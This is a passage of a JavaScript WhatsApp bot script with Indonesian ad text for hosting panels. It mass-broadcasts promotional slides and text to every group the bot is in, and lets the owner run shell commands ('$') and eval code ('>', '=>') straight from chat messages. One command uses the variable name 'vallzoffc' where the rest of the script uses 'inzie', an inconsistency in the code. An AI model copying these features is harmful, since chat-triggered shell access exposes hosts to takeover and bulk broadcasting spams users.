 • RAM UNLI | CPU UNLI =[ 14.000 ]

_KEUNTUNGAN MEMBELI PANEL_
- ADMIN HANYA 2
- WEB CLOSE BOT TTP ON
- BOT ON 24 JAM
- HEMAT MEMO
- HEMAT DATA
- ANTI DELAY
- SRV AMAN
- DLL`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*SELAIN ITU JUGA MENYEDIAKAN*
- RANEME SC
- RECODE SC
- JASA RUN
- BOT JAGA GROUP
- SUBDOMAIN
- DLL`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qchanel})
await inzieReply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await inzie.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await m.reply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break;

case 'bcgc': case 'bcgroup': {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await vallzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
inzie.sendMessage(i, {text: `${text}`}, {quoted:qchanel})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return inzie.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return inzie.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
inzie.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
inzie.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return inzie.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return inzie.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
//inzie.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})